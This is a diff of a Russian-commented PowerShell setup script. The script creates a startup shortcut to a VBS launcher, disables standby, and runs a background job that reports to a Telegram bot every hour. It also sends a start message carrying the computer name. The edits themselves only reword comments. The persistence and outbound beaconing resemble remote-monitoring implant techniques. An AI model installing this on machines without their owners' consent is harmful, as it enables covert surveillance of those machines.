@@ -69,12 +69,11 @@ $shortcut = "[InternetShortcut]`nURL=file:///$path\win_start.vbs"
 $shortcut | Out-File -FilePath $startupFile -Encoding ascii
 
 # 7. ПИТАНИЕ, СТАРТ И МОНИТОРИНГ
-# 7. ПИТАНИЕ, СТАРТ И МОНИТОРИНГ (ОБНОВЛЕННЫЙ)
 powercfg /x -monitor-timeout-ac 5
 powercfg /x -standby-timeout-ac 0
 Start-Process -FilePath "$path\win_start.vbs"
 
-# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ - Исправлена передача данных внутрь Job
+# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ (ИСПРАВЛЕННЫЙ)
 $Monitor = {
     param($token, $id, $pc) # Принимаем данные из основного скрипта
     while($true) {
@@ -88,16 +87,17 @@ $Monitor = {
             Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue 
         } catch {}
 
-        Start-Sleep -Seconds 3600 # Спим час ПОСЛЕ отправки первого отчета
+        # Спим час ПОСЛЕ отправки отчета
+        Start-Sleep -Seconds 3600 
     }
 }
 
-# Запускаем фоновую задачу и ПЕРЕДАЕМ ей токен, ID и имя ПК
+# Запускаем Job и ПЕРЕДАЕМ переменные (token, id, name) внутрь
 Start-Job -ScriptBlock $Monitor -ArgumentList $tgToken, $chatId, $env:COMPUTERNAME
 
-# Уведомление о немедленном старте
+# Уведомление о старте (без задержки)
 $urlStart = "https://api.telegram.org/bot$tgToken/sendMessage"
 $bodyStart = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]: 🚀 СКРИПТ АКТИВИРОВАН! Мониторинг запущен." }
 Invoke-RestMethod -Uri $urlStart -Method Post -Body $bodyStart -ErrorAction SilentlyContinue
 
-Write-Host "--- БЛОК 7 ОБНОВЛЕН (ТГ ОТЧЕТЫ ВКЛЮЧЕНЫ) ---" -ForegroundColor Magenta
+Write-Host "--- ВСЁ ГОТОВО (ОТЧЕТЫ ПОЧИНЕНЫ) ---" -ForegroundColor Magenta
